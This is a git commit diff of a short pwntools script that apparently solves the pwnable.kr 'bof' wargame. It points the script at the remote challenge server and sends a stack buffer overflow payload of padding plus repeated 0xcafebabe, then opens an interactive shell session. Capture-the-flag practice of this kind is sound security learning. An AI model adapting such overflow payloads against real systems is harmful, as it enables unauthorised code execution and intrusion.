7e54bb4af49867c2ebdc74d3ca7938b6750ab4de
Drew Barrett <dbarret1@umbc.edu>
2020-08-09 20:09:22 -0400

    boffy

--- bof/shit.py
+++ bof/shit.py
@@ -2,10 +2,10 @@ from pwn import *
 context.terminal = ['gnome-terminal', '-e']
 x = p32(0xcafebabe)
 print(x)
-#p = remote('pwnable.kr', 9000)
-p = process(['./boffy'])
-gdb.attach(p)
-z = bytes(0x1)*32 + x
+p = remote('pwnable.kr', 9000)
+#p = process(['./boffy'])
+#gdb.attach(p)
+z = b'A'*32 + x*32
 print(z)
 p.sendline(z)
 p.interactive()
